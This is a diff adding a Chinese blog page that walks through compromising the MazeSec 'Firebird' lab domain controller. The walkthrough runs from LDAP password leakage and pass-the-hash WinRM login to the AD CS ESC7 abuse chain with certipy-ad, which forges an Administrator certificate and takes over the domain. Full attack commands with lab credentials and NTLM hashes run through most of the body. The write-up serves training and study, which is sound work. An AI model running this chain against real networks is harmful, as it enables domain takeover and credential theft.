@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - MazeSec Firebird</title>
+        <meta name="description" content="靶机信息 靶机名称： Firebird 靶机作者：kaada 靶机类型：Windows 来源：MazeSec/QQ公开群 321948805 官网：https://maze-sec.com/ 关键词：AD CS ESC7 利用、LDAP 属性信息泄露、NTLM 哈希传递、PKINIT 域认证 摘要：本文记录了 Maze…">
+    <link rel="canonical" href="https://the0n3.top/posts/maze-firebird/">
+    <!-- Open Graph -->
+    <meta property="og:title" content="MazeSec Firebird">
+    <meta property="og:description" content="靶机信息 靶机名称： Firebird 靶机作者：kaada 靶机类型：Windows 来源：MazeSec/QQ公开群 321948805 官网：https://maze-sec.com/ 关键词：AD CS ESC7 利用、LDAP 属性信息泄露、NTLM 哈希传递、PKINIT 域认证 摘要：本文记录了 Maze…">
+    <meta property="og:url" content="https://the0n3.top/posts/maze-firebird/">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="the0n3">
+    <meta property="og:locale" content="zh_CN">
+        <meta property="og:image" content="https://the0n3.top/./maze-firebird/1.png">
+        <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="MazeSec Firebird">
+    <meta name="twitter:description" content="靶机信息 靶机名称： Firebird 靶机作者：kaada 靶机类型：Windows 来源：MazeSec/QQ公开群 321948805 官网：https://maze-sec.com/ 关键词：AD CS ESC7 利用、LDAP 属性信息泄露、NTLM 哈希传递、PKINIT 域认证 摘要：本文记录了 Maze…">
+        <meta name="twitter:image" content="https://the0n3.top/./maze-firebird/1.png">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+    <!-- 功能样式（自动扫描 assets/features/ 目录） -->
+        <link rel="stylesheet" href="/assets/features/code-fold/style.css">
+        <link rel="stylesheet" href="/assets/features/image-enhance/style.css">
+        <link rel="stylesheet" href="/assets/features/reading-progress/style.css">
+        <link rel="stylesheet" href="/assets/features/tax-accordion/style.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <link rel="stylesheet" href="/assets/css/search.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+    <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+    <header>
+        <nav>
+            <div class="nav-right">
+                                <a href="/">首页</a>
+                                <a href="/archives/">归档</a>
+                                <a href="/categories/">分类</a>
+                                <a href="/tags/">标签</a>
+                                <a href="/friends/">友链</a>
+                                <a href="/about/">关于</a>
+                                <a href="https://www.travellings.cn/go.html">开往</a>
+                                                <button
+                    id="searchTrigger"
+                    class="search-trigger"
+                    type="button"
+                    aria-label="打开搜索"
+                    aria-haspopup="dialog"
+                    aria-controls="searchModal"
+                    title="搜索（/）"
+                >
+                    <span class="search-trigger__label">搜索</span>
+                    <span class="search-trigger__hint">/</span>
+                </button>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>MazeSec Firebird</h1>
+    <p>
+        <span class="meta">发布于: 2026-07-22 15:16</span>
+    </p>
+    <div class="post-body">
+        <h2>靶机信息</h2>
+<p>靶机名称： Firebird<br>
+靶机作者：kaada<br>
+靶机类型：Windows<br>
+来源：MazeSec/QQ公开群 321948805<br>
+官网：<a href="https://maze-sec.com/">https://maze-sec.com/</a>  </p>
+<p><strong>关键词</strong>：AD CS ESC7 利用、LDAP 属性信息泄露、NTLM 哈希传递、PKINIT 域认证</p>
+<p><strong>摘要</strong>：本文记录了 MazeSec Firebird Windows 域靶机的完整渗透过程。选手从给定的普通域用户 ll104567 凭证出发，通过 LDAP 协议精细化枚举发现 111 用户的 info 字段泄露数据库服务账号密码，利用该凭证访问受保护的 DB_Vault 共享目录，获取 sublarge 用户的 NTLM 哈希；通过哈希传递（PTH）结合 WinRM 服务获取 sublarge 的交互式权限，枚举 AD CS 配置后发现该用户对证书颁发机构拥有 ESC7 类高危管理权限，可通过「添加 CA Officer → 启用 SubCA 模板 → 提交域管身份证书请求 → 强制签发被拒请求」的利用链，绕过模板注册限制签发域管理员有效证书；最终借助 PKINIT 认证获取域管 NTLM 哈希，完成域控接管。该靶机重点考察域内 LDAP 属性信息泄露排查、AD CS 权限配置缺陷（ESC7）利用、PKI 信任链滥用等域渗透核心技能，还原了企业 AD 环境中非漏洞类权限提升的典型攻击路径。</p>
+<h2>攻击链复盘</h2>
+<pre><code class="language-plaintext">1. ll104567:Pass_123456!                    → 普通域用户
+2. LDAP info 字段泄露                        → 111:Ldap_P@ssw0rd_2026!
+3. 111 访问 DB_Vault                         → db_config.ini
+4. db_config.ini 泄露                        → sublarge 的 NTLM Hash
+5. sublarge PTH + WinRM 登录                 → 普通域用户，无特权
+6. Certipy 枚举 AD CS                        → ESC7（CA 危险权限）+ SubCA 模板
+7. ESC7 攻击链                               → Administrator.pfx
+8. PKINIT 认证                               → Administrator NTLM Hash
+9. 域控接管                                  → 完全控制 firebird.local</code></pre>
+<h2>信息收集</h2>
+<p>arp-scan 扫描局域网内存活主机，发现目标主机 IP 地址为192.168.56.140</p>
+<p><img src="./maze-firebird/1.png" alt="" decoding="async"></p>
+<p>扫描端口</p>
+<p><img src="./maze-firebird/2.png" alt="" decoding="async" loading="lazy"></p>
+<p>通过下面服务可以分析出这是一台域控主机</p>
+<pre><code class="language-plaintext">- DNS(53)、Kerberos(88)、LDAP(389/636)、Global Catalog(3268/3269)、ADWS(9389)
+- SMB(445)、NetBIOS(139)
+- RPC(135/593) + 大量 49xxx 动态端口
+- WinRM(5985)</code></pre>
+<h2>域信息收集</h2>
+<p>通过作者给出的初始凭证<code>ll104567:Pass_123456!</code>，进行域信息收集</p>
+<p>验证凭证</p>
+<pre><code class="language-bash">crackmapexec smb 192.168.56.140 -u ll104567 -p Pass_123456!</code></pre>
+<p>凭证有效，域名为 firebird.local</p>
+<p><img src="./maze-firebird/3.png" alt="" decoding="async" loading="lazy"></p>
+<p>枚举域用户</p>
+<pre><code class="language-bash">crackmapexec smb 192.168.56.140 -u ll104567 -p 'Pass_123456!' -d firebird.local --users</code></pre>
+<p>存在用户111、sublarge、ll104567、Administrator</p>
+<p><img src="./maze-firebird/4.png" alt="" decoding="async" loading="lazy"></p>
+<p>获取密码策略，通过账号锁定阈值为0、密码复杂度没有要求，爆破口令不失为好的选择</p>
+<pre><code class="language-bash">crackmapexec smb 192.168.56.140 -u ll104567 -p 'Pass_123456!' -d firebird.local --pass-pol</code></pre>
+<p><img src="./maze-firebird/5.png" alt="" decoding="async" loading="lazy"></p>
+<p>枚举smb共享，无权限访问DB_Vault</p>
+<pre><code class="language-bash">crackmapexec smb 192.168.56.140 -u ll104567 -p 'Pass_123456!' -d firebird.local --shares</code></pre>
+<p><img src="./maze-firebird/6.png" alt="" decoding="async" loading="lazy"></p>
+<h2>LDAP 信息泄露</h2>
+<p>CME（CrackMapExec）smb模块枚举域信息有限，使用 LDAP 协议做精细化枚举</p>
+<pre><code class="language-bash">nxc ldap 192.168.56.140 -u ll104567 -p 'Pass_123456!' -d firebird.local --users</code></pre>
+<p>111用户描述信息'Service Account for DB Backup Validation.'，与smb共享DB_Vault相关</p>
+<p><img src="./maze-firebird/7.png" alt="" decoding="async" loading="lazy"></p>
+<p>ldapsearch 深度枚举111用户，info字段发现密码为<code>Ldap_P@ssw0rd_2026!</code></p>
+<pre><code class="language-bash">ldapsearch -LLL -x -H ldap://192.168.56.140 -D "ll104567@firebird.local" -w 'Pass_123456!' -b "DC=firebird,DC=local" "(sAMAccountName=111)" "*"</code></pre>
+<p><img src="./maze-firebird/8.png" alt="" decoding="async" loading="lazy"></p>
+<p>验证</p>
+<pre><code class="language-bash">crackmapexec smb 192.168.56.140 -u 111 -p 'Ldap_P@ssw0rd_2026!'</code></pre>
+<p><img src="./maze-firebird/9.png" alt="" decoding="async" loading="lazy"></p>
+<h2>访问 DB_Vault 泄露 NTLM Hash</h2>
+<p>使用 111 用户访问 DB_Vault，发现 db_config.ini 文件</p>
+<pre><code class="language-bash">smbclient //192.168.56.140/DB_Vault -U '111%Ldap_P@ssw0rd_2026!'</code></pre>
+<p>获取到 db_config.ini 文件，里面有 sublarge 用户的 NTLM Hash</p>
+<p><img src="./maze-firebird/10.png" alt="" decoding="async" loading="lazy"></p>
+<p>验证NTLM hash有效性</p>
+<pre><code class="language-bash">crackmapexec smb 192.168.56.140 -u sublarge -H 2d9b24ded78750921eecd7dfea8d54ae</code></pre>
+<p><img src="./maze-firebird/11.png" alt="" decoding="async" loading="lazy"></p>
+<h2>PTH + WinRM 登录</h2>
+<p>现在有了ll104567、111、sublarge三个用户的凭证，尝试使用 WinRM 登录，仅sublarge可以正常登录，说明sublarge在<code>remote management</code>组中</p>
+<pre><code class="language-bash">evil-winrm -i 192.168.56.140 -u sublarge@firebird.local -H 2d9b24ded78750921eecd7dfea8d54ae</code></pre>
+<p><img src="./maze-firebird/12.png" alt="" decoding="async" loading="lazy"></p>
+<p><img src="./maze-firebird/13.png" alt="" decoding="async" loading="lazy"></p>
+<p>sublarge在<code>remote management</code>、<code>FIREBIRD_DOM\CertManagers_Group</code>组中，CertManagers_Group 的存在提示目标域启用了 AD CS 服务，且该组很可能被赋予了证书管理相关 ACL</p>
+<h2>AD CS 枚举与 ESC7 发现</h2>
+<blockquote>
+<p>Active Directory Certificate Services（AD CS）​ 是 Windows Server 提供的 PKI 实现，负责在域内颁发和管理数字证书，用于身份认证、加密与签名。由于证书可直接用于 Kerberos PKINIT 认证，且企业部署中常存在模板配置不当、CA 权限过大等问题，AD CS 已成为 AD 环境中一类重要的非漏洞型提权攻击面（典型如 ESC1–ESC8）。核心逻辑：如果能骗 CA 给你发一张“身份是域管”的有效证书，那你就能用这张证书通过 Kerberos PKINIT 认证成域管，拿到 TGT 甚至 NTLM Hash，而不需要域管密码。</p>
+</blockquote>
+<p>使用 <code>certipy-ad find</code> 以 <code>sublarge</code> 的身份枚举 AD CS 配置：</p>
+<pre><code class="language-bash">certipy-ad find -u sublarge@firebird.local -hashes :2d9b24ded78750921eecd7dfea8d54ae -dc-ip 192.168.56.140</code></pre>
+<p>域控上存在 1 个证书颁发机构：firebird-FIREBIRD-CA</p>
+<p><img src="./maze-firebird/14.png" alt="" decoding="async" loading="lazy"></p>
+<p>CA firebird-FIREBIRD-CA 的 ACL 配置存在 ESC7 风险——当前用户 sublarge 对 CA 具备 ManageCA 类高危权限，可操纵证书模板与签发流程；</p>
+<p>内置 SubCA 模板虽仅限 Domain Admins 注册，但结合 ESC7 的“拒绝后强制签发”机制，可绕过模板 Enrollment Rights 限制，可用于签发下级 CA 证书，在 AD CS 信任链中具备等效于域管的认证能力，因此可被滥用于 PKINIT 域提权。</p>
+<p><img src="./maze-firebird/15.png" alt="" decoding="async" loading="lazy"></p>
+<p><img src="./maze-firebird/16.png" alt="" decoding="async" loading="lazy"></p>
+<h2>ESC7 利用：SubCA 模板滥用</h2>
+<p>基于前文发现的 ESC7 风险，sublarge 对 CA firebird-FIREBIRD-CA 拥有 ManageCA 权限。这意味着即便 SubCA 模板仅允许 Domain Admins 注册，sublarge 仍可绕过该限制，完成“请求 → 拒绝 → 强制签发”的攻击链。</p>
+<p>整个利用流程分为五个阶段：添加 CA Officer → 启用 SubCA 模板 → 提交域管证书请求 → 强制签发 → PKINIT 认证提权。</p>
+<h3>添加 CA Officer（获取 ManageCertificates 权限）</h3>
+<p>虽然 sublarge 已有 ManageCA，但为了能够签发被拒绝的请求，还需显式将自己添加为 CA Officer（即获得 ManageCertificates 权限） </p>
+<pre><code class="language-bash">certipy-ad ca -u sublarge@firebird.local -hashes :2d9b24ded78750921eecd7dfea8d54ae \
+  -dc-ip 192.168.56.140 -ca firebird-FIREBIRD-CA -add-officer sublarge</code></pre>
+<p><img src="./maze-firebird/17.png" alt="" decoding="async" loading="lazy"></p>
+<p>原理：ManageCA 允许管理 CA 配置（如启用模板），而 ManageCertificates 允许批准/拒绝证书请求。ESC7 的完整利用通常需要两者兼备，因此首先通过 -add-officer 将自身加入 CA Officer 列表。</p>
+<h3>启用 SubCA 模板</h3>
+<p>默认情况下，SubCA 模板处于禁用状态。使用 ManageCA 权限启用该模板：</p>
+<pre><code class="language-bash">certipy-ad ca -u sublarge@firebird.local -hashes :2d9b24ded78750921eecd7dfea8d54ae \
+  -dc-ip 192.168.56.140 -ca firebird-FIREBIRD-CA -enable-template SubCA</code></pre>
+<p><img src="./maze-firebird/18.png" alt="" decoding="async" loading="lazy"></p>
+<p>原理：SubCA（下级 CA）模板在 AD CS 信任链中具有极高权限，可被用于签发任意身份的证书。由于其危险性，默认不启用。ESC7 允许低权限用户启用该模板，从而为后续伪造域管证书创造条件。</p>
+<h3>以 Administrator 身份提交 SubCA 证书请求</h3>
+<p>使用 certipy-ad req 以 Administrator 的 UPN 提交证书请求。由于 sublarge 不在 Enrollment Rights 中，该请求会被 CA 拒绝（Pending/Denied），但仍会生成唯一的 Request ID：</p>
+<pre><code class="language-bash">certipy-ad req -u sublarge@firebird.local -hashes :2d9b24ded78750921eecd7dfea8d54ae \
+  -dc-ip 192.168.56.140 -ca firebird-FIREBIRD-CA \
+  -template SubCA -upn Administrator@firebird.local</code></pre>
+<p><img src="./maze-firebird/19.png" alt="" decoding="async" loading="lazy"></p>
+<ul>
+<li>-upn Administrator@firebird.local：指定证书绑定的身份为域管</li>
+<li>命令执行后会返回 Request ID is X，该 ID 是后续强制签发的关键</li>
+<li>此时证书尚未生效，因为 CA 拒绝了该请求</li>
+</ul>
+<h3>强制签发被拒的证书请求</h3>
+<p>利用此前获得的 ManageCertificates 权限，强行签发第 3 步中被拒绝的请求：</p>
+<pre><code class="language-bash">certipy-ad ca -u sublarge@firebird.local -hashes :2d9b24ded78750921eecd7dfea8d54ae \
+  -dc-ip 192.168.56.140 -ca firebird-FIREBIRD-CA -issue-request 4</code></pre>
+<p><img src="./maze-firebird/20.png" alt="" decoding="async" loading="lazy"></p>
+<p>ESC7 核心步骤：​正常流程中，被拒绝的请求需要域管手动批准。但在 ESC7 场景下，sublarge 既是“申请者”，又是“审批者”，因此可以自行批准自己的恶意请求，绕过模板的 Enrollment Rights 限制。</p>
+<h3>取回证书并进行 PKINIT 认证</h3>
+<p>请求被签发后，使用相同的 Request ID 取回证书，并通过 PKINIT 进行 Kerberos 认证，直接获取 Administrator 的 NTLM Hash：</p>
+<pre><code class="language-bash"># 取回证书
+certipy-ad req -u sublarge@firebird.local -hashes :2d9b24ded78750921eecd7dfea8d54ae \
+  -dc-ip 192.168.56.140 -ca firebird-FIREBIRD-CA -retrieve 4
+
+# PKINIT 认证
+certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.56.140</code></pre>
+<p><img src="./maze-firebird/21.png" alt="" decoding="async" loading="lazy"></p>
+<ul>
+<li>administrator.pfx 是一个有效的域管证书</li>
+<li>certipy-ad auth 利用该证书完成 PKINIT 认证，成功获取 TGT，并自动导出 Administrator 的 NTLM Hash</li>
+</ul>
+<h3>域控接管</h3>
+<p>使用获取的 NTLM Hash 通过 WinRM 登录域控，验证权限：</p>
+<pre><code class="language-bash">evil-winrm -i 192.168.56.140 -u Administrator -H 9fbb1566fa1ff2c13c56255d7e360635</code></pre>
+<p><img src="./maze-firebird/22.png" alt="" decoding="async" loading="lazy"></p>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>MazeSec</span>
+                                    <span>Windows</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#ESC7</span>
+                            </span>
+            </div>
+    </article>
+
+
+<section class="post-comments" aria-label="Comments">
+    <script src="https://giscus.app/client.js"
+        data-repo="Apursuit/the0n3-blog"
+        data-repo-id="R_kgDORvPPbA"
+        data-category="Announcements"
+        data-category-id="DIC_kwDORvPPbM4C5KAt"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="light"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+    </script>
+</section>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+    
+    <!-- 搜索命令面板：
+         第一版先提供标题、日期、标签搜索，以及键盘导航和快捷键 -->
+    <div id="searchModal" class="search-modal" hidden>
+        <div class="search-modal__overlay" data-search-close></div>
+        <div class="search-modal__dialog" role="dialog" aria-modal="true" aria-labelledby="searchModalTitle">
+            <div class="search-modal__panel">
+                <div class="search-modal__header">
+                    <div class="search-modal__title-group">
+                        <div id="searchModalTitle" class="search-modal__title">搜索文章</div>
+                        <div class="search-modal__subtitle">输入标题、标签或关键词，按 Enter 打开结果</div>
+                    </div>
+                    <button
+                        id="searchClose"
+                        class="search-modal__close"
+                        type="button"
+                        aria-label="关闭搜索"
+                        title="关闭搜索"
+                    >
+                        ×
+                    </button>
+                </div>
+
+                <div class="search-modal__body">
+                    <label class="search-input-wrap" for="searchInput">
+                        <span class="search-input-wrap__icon" aria-hidden="true">⌕</span>
+                        <input
+                            id="searchInput"
+                            class="search-input"
+                            type="text"
+                            placeholder="搜索文章..."
+                            autocomplete="off"
+                            spellcheck="false"
+                        >
+                    </label>
+
+                    <div class="search-help">
+                        <span>/ 打开</span>
+                        <span>↑ ↓ 选择</span>
+                        <span>Enter 打开</span>
+                        <span>Esc 关闭</span>
+                    </div>
+
+                    <div id="searchState" class="search-state" aria-live="polite">输入关键词开始搜索</div>
+                    <div id="searchResults" class="search-results" role="listbox" aria-label="搜索结果"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+    <!-- 功能脚本（自动扫描 assets/features/ 目录） -->
+        <script src="/assets/features/code-fold/script.js"></script>
+        <script src="/assets/features/image-enhance/script.js"></script>
+        <script src="/assets/features/reading-progress/script.js"></script>
+        <script src="/assets/features/tax-accordion/script.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+    <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+    <!-- 弹簧动画工具（搜索弹窗/灯箱进出场依赖） -->
+    <script src="/assets/js/spring.js"></script>
+    <!-- 搜索功能 -->
+    <script src="/assets/js/fuse.js"></script>
+    <script src="/assets/js/search.js"></script>
+</body>
+</html>
